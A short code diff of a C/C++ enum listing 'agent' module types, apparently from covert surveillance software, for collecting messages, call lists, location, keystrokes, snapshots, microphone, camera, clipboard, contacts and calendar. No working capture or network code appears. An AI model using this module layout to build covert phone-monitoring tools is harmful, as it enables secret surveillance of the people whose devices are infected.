@@ -35,21 +35,21 @@ enum TAgentType
 	{
 	EAgent			= 0x1000,
 	EAgent_Messages = 0x1001,				// ***
-	EAgent_Tasks_TODO = 0x1002,				
-	EAgent_CallList_TODO,				
-	EAgent_Device = 0x1004,
+	EAgent_Tasks_TODO = 0x1002,				// ***
+	EAgent_CallList = 0x1003,				
+	EAgent_Device = 0x1004,				// ***
 	EAgent_Position = 0x1005,				// ***
 	EAgent_Call_TODO,
-	EAgent_CallLocal_TODO,
+	EAgent_CallLocal,
 	EAgent_Keylog_TODO,
-	EAgent_Snapshot = 0x1009,
+	EAgent_Snapshot = 0x1009,		// ***
 	EAgent_URL_TODO,
 	//EAgent_IM_TODO,
-	EAgent_Mic = 0x100D,
+	EAgent_Mic = 0x100D,			// ***
 	EAgent_Cam_TODO,
 	EAgent_Clipboard_TODO,
 	EAgent_Crisis_TODO,
-	EAgent_Application = 0x1011,
+	EAgent_Application = 0x1011,     // ***
 	EAgent_PDA_TODO,	
 	EAgent_Addressbook,				// ***
 	EAgent_Calendar,				// ***
